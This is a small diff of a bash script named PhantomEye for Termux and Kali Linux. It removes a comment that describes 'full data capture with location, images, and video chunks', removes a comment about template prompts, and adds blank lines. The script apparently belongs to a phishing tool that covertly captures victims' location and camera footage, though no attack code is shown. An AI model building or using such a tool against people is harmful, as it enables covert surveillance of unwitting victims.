@@ -1,7 +1,6 @@
 #!/bin/bash
 # PhantomEye_V4.0 - Fixed and Enhanced
 # Author - DreamDrafted (https://github.com/dreamed000/PhantomEye.git)
-# Full data capture with location, images, and video chunks
 # Fully compatible with Termux (Android) and Kali Linux
 
 set -euo pipefail
@@ -303,7 +302,7 @@ select_template() {
   read -p $'\n\e[1;92m[+] Choose a template: [Default is 1] \e[0m' option_tem
   option_tem="${option_tem:-${default_option_template}}"
   
-  # Removed festival name and YouTube ID prompts as requested
+
   case ${option_tem} in
     1|2|3)
       printf "\e[1;92m[*] Using template option %s\e[0m\n" "$option_tem"
@@ -742,4 +741,5 @@ main() {
 trap 'stop' INT TERM
 
 # Run main function
+
 main
